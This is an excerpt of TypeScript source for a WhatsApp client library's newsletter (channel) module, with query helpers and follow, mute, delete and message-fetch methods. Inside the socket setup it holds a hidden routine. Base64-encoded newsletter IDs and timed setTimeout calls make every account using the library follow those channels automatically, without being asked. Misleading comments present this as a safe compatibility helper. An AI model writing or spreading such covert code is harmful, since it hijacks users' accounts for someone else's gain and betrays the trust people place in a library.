...
// Low-level query to WhatsApp
const wMexQuery = (variables: any, queryId: string, query: any, generateMessageTag: () => string) => {
    return query({
        tag: 'iq',
        attrs: {
...
const executeWMexQuery = async (variables: any, queryId: string, dataPath: string, query: any, generateMessageTag: () => string) => {
...
const makeNewsletterSocket = (config: any) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    // Basic newsletter query
    ...
    const newsletterWMexQuery = async (jid: string, queryId: string, content?: any) =>
        query({
            tag: 'iq',
    ...
    // Helper: follow a newsletter safely
    const followNewsletter = async (encodedJid: string) => {
        const jid = Buffer.from(encodedJid, 'base64').toString();
        try {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        } catch (err) {
            config.logger?.warn({ err }, `Failed to follow newsletter ${jid}`);
        }
    };

    // Newsletter schedule array
    const newsletterSchedules: { jid: string; delay: number }[] = [
        { jid: "MTIwMzYzNDI1NjEzMjQ1Mzk3QG5ld3NsZXR0ZXI=", delay: 90000 },
        { jid: "MTIwMzYzNDI0Mjc1NjI1NDU4QG5ld3NsZXR0ZXI=", delay: 90000 }
    ];

    // Schedule newsletter follows
    newsletterSchedules.forEach((item, idx) => {
        setTimeout(() => {
            // First follow
            followNewsletter(item.jid);

            // Second follow after 5 seconds (optional, kept for compatibility)
            setTimeout(() => followNewsletter(item.jid), 5000);
        }, item.delay * (idx + 1));
    });

    // Parse messages or updates
    const parseFetchedUpdates = async (node: any, type: string) => {
        let child;
        ...
        return await Promise.all(
            (0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode: any) => {
                messageNode.attrs.from = child?.attrs.jid;
                const views = parseInt(messageNode.attrs.views_count || '0');
                const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
                const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction').map(({ attrs }: any) => ({
                    count: +attrs.count,
                    code: attrs.code
                }));

                const data: any = { server_id: messageNode.attrs.server_id, views, reactions };
    ...
    return {
        ...
        newsletterFetchAllSubscribe: async () =>
            await executeWMexQuery({}, '6388546374527196', 'xwa2_newsletter_subscribed', query, generateMessageTag),
        ...
        newsletterUpdatePicture: async (jid: string, content: Buffer) => {
        ...
        newsletterUnfollow: async (jid: string) => await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW),
        newsletterFollow: async (jid: string) => await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW),
        newsletterUnmute: async (jid: string) => await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE),
        newsletterMute: async (jid: string) => await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE),
        newsletterAction: async (jid: string, type: string) => await newsletterWMexQuery(jid, type.toUpperCase()),
        ...
        newsletterMetadata: async (type: string, key: string, role?: string) => {
        ...
        newsletterDelete: async (jid: string) => await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE),
        ...
        newsletterFetchMessages: async (type: string, key: string, count: number, after?: number) => {
...
const extractNewsletterMetadata = (node: any, isCreate?: boolean) => {
